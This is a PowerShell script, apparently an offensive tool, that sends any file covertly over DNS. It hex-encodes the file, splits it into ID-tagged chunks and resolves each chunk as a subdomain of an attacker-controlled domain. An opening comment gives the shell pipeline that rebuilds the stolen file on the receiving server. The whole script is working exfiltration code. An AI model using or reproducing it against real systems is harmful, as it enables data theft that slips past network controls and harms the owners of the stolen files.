#the file on the server (specified in the server python command) can be parsed as follows:
# cat out.hex | tr 'x' '\n' | tr 'A-Z' 'a-z' | sort -u  | sort -n | cut -d"y" -f 2 | tr -d "\n" | xxd -r -p > out.file

Param (
	[Parameter(Mandatory=$true)][string]$domain,
	[Parameter(Mandatory=$true)][string]$file
)

#hex-encode provided input file
$hexdata = Format-Hex -Path $file
#compute length of hex-encoded data
$hexlength = $hexdata.Bytes.Length
#fqdn labels have a max length of 63 bytes, so we can use at max 62 bytes to transfer hex-encoded data
$maxlength = 62

$cursor = $id = 0
while($true)
{
	#each chunk is prepended by an ID surrounded by "x" and "y" for easy parsing  later on
    $chunkid = "x$($id)y"
	#checking how much space the ID will take up
    $chunkidlength = $chunkid.Length
	#calculating the remaining length which can be used for data extraction
    $chunksize = [int][Math]::Floor(($maxlength - $chunkidlength) /2)
	#calculating how far we can read ahead
    $cursorend = if ($cursor+$chunksize > $hexlength) { $hexlength -1 } Else { $cursor + $chunksize -1}
	#read chunk from hex-encoded data
    $chunk = ($hexdata.bytes[$cursor..$cursorend] | ForEach-Object ToString X2) -join ''
	#perform dns resolution to exfiltrate chunk
    Resolve-DnsName "$($chunkid)$($chunk).$($domain)" -Type A
    Write-Host "Chunk $chunkid$chunk sent."
    $cursor += $chunksize
	$id++
	#break when file end is reached
    if ($cursor -gt ($hexlength - 1)) {
        break
    }
}
